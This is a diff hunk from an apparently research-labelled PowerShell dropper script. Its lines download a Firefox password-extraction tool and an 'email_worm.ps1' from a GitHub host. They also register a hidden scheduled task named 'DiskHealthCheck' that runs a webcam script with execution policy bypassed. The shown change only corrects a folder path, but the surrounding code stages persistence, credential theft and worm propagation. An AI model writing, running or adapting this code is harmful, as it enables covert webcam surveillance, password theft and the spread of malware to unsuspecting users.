@@ -142,7 +142,7 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchPr
 schtasks /create /tn "DiskHealthCheck" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $tempPath\webcam.ps1" /sc ONCE /st 00:00 /ru INTERACTIVE 
 
 # Download files for email-worm
-mkdir "Public Display"
+mkdir "C:\Users\Public\Public Display"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/firepwd.py' -OutFile "C:\Users\Public\Public Display\firepwd.py"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/requirements.txt' -OutFile "C:\Users\Public\Public Display\requrements.txt"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/emial_worm.ps1' -OutFile "C:\Users\Public\Public Display\email_worm.ps1"
